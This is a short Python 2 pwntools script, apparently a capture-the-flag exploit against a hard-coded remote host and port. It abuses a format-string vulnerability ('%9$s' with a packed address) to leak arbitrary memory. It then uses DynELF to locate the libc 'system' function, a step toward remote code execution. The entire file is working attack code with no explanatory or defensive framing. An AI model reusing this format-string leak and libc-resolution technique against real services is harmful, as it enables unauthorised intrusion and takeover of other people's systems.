from pwn import *
from multiprocessing import Pool

HOST, PORT = '139.59.61.220', 52345

def leak(addr):
	payload = '%9$s-end' + p32(addr)
	return go(payload)

def go(payload):
	r = remote(HOST, PORT)
	r.sendline(payload)
	r.recvuntil('Hola ')
	data = r.recvuntil('-end', drop=True) + '\x00'
	r.close()
	print `payload` + ':'
	print hexdump(data)
	return data
d = DynELF(leak, 0x8049008)
system = hex(d.lookup('system', 'libc'))